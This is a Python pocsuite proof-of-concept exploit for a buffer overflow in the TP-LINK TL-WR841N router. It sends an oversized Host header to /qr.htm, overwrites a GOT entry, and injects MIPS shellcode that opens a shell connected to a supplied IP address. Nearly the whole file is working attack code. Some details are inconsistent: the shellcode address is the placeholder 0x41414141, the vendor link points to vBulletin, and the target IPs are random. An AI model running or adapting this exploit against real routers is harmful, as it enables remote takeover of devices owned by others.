#!/usr/bin/python
# -*- coding: utf-8 -*-
from pocsuite.api.request import req
from pocsuite.api.poc import register
from pocsuite.api.poc import Output, POCBase
from pwn import *
import sys
import urllib2
import urllib
import base64
import random


class TestPOC(POCBase):
    vulID = ''
    version = '1.0'
    author = 'co0ontty'
    vulDate = '2019-12-04'
    createDate = '2019-12-04'
    updateDate = '2019-12-04'
    references = [
        'https://www.zerodayinitiative.com/blog/2019/12/2/mindshare-hardware-reversing-with-the-tp-link-tl-wr841n-router-part-2']
    name = 'TP-LINK TL-WR841N 远程命令执行漏洞'
    appPowerLink = 'https://www.vbulletin.com/'
    appName = 'TP-LINK'
    appVersion = 'TL-WR841N'
    vulType = '命令执行'
    desc = '''
    该错误是ZDI程序的新提交者Nguyen Hoang Thach发现的经典缓冲区溢出漏洞
    '''
    samples = ['']
    install_requires = []

    def _verify(self):
        result = {}

        def make_req(path, arg=None, host=str(random.randint(1, 9))+"."+str(random.randint(1, 9))+"."+str(random.randint(1, 9))+"."+str(random.randint(1, 9)), has_ContentLength=False):
            headers = {'Host': host}
            if has_ContentLength:
                headers['Content-Length'] = '0'
            if arg is not None:
                parameter = arg
                parameter = urllib.urlencode(parameter)
                fullurl = self.url+path + '?' + parameter
            else:
                fullurl = self.url+path
            print (fullurl)
            req = urllib2.Request(fullurl, None, headers)
            response = urllib2.urlopen(req)
            data = response.read()
            return data

        def shellcode(ip):  # port listen : 31337
            ip = p32(int(socket.inet_aton(ip).encode('hex'), 16))
            shell = "\xff\xff\x04\x28\xa6\x0f\x02\x24\x0c\x09\x09\x01\x11\x11\x04\x28"
            shell += "\xa6\x0f\x02\x24\x0c\x09\x09\x01\xfd\xff\x0c\x24\x27\x20\x80\x01"
            shell += "\xa6\x0f\x02\x24\x0c\x09\x09\x01\xfd\xff\x0c\x24\x27\x20\x80\x01"
            shell += "\x27\x28\x80\x01\xff\xff\x06\x28\x57\x10\x02\x24\x0c\x09\x09\x01"
            shell += "\xff\xff\x44\x30\xc9\x0f\x02\x24\x0c\x09\x09\x01\xc9\x0f\x02\x24"
            shell += "\x0c\x09\x09\x01\x79\x69\x05\x3c\x01\xff\xa5\x34\x01\x01\xa5\x20"
            shell += "\xf8\xff\xa5\xaf" + \
                ip[:2][::-1] + "\x05\x3c" + ip[2:][::-1] + \
                "\xa5\x34\xfc\xff\xa5\xaf"
            shell += "\xf8\xff\xa5\x23\xef\xff\x0c\x24\x27\x30\x80\x01\x4a\x10\x02\x24"
            shell += "\x0c\x09\x09\x01\x62\x69\x08\x3c\x2f\x2f\x08\x35\xec\xff\xa8\xaf"
            shell += "\x73\x68\x08\x3c\x6e\x2f\x08\x35\xf0\xff\xa8\xaf\xff\xff\x07\x28"
            shell += "\xf4\xff\xa7\xaf\xfc\xff\xa7\xaf\xec\xff\xa4\x23\xec\xff\xa8\x23"
            shell += "\xf8\xff\xa8\xaf\xf8\xff\xa5\x23\xec\xff\xbd\x27\xff\xff\x06\x28"
            shell += "\xab\x0f\x02\x24\x0c\x09\x09\x01"
            # print shell
            return shell

        def exploit(ip, target_ip):  # Router IP
            l_host_addr = 0x438154
            atol_got_addr = 0x423780 - 4
            host_padding = 'a' * 512
            #shellcode_addr = l_host_addr + 0x40
            shellcode_addr = 0x41414141

            print "[+] Sending exploit to ip:%s" % (target_ip)
            host_str = host_padding + 'aaaa' + p32(shellcode_addr)
            make_req('/qr.htm', host=host_str)
            print "[+] Overflowing buffer"
            host_str = host_padding + p32(atol_got_addr)
            make_req('/qr.htm', host=host_str)
            print "[+] Overwriting got entry"
            make_req('/qr.htm', {'_': 'hello'})   # Write

            host_str = 'q'*0x40 + shellcode(ip)
            make_req('/qr.htm', host=host_str)
            try:
                make_req('/qr.htm', has_ContentLength=True)
            except Exception:
                pass
            result['VerifyInfo'] = {}
            result['VerifyInfo']['URL'] = self.url
        # context.arch='mips'
        exploit(str(random.randint(1, 5))+"."+str(random.randint(1, 5))+"." +
                str(random.randint(1, 5))+"."+str(random.randint(1, 5)), self.url)
        return self.parse_output(result)

    _attack = _verify

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('Internet nothing returned')
        return output


register(TestPOC)
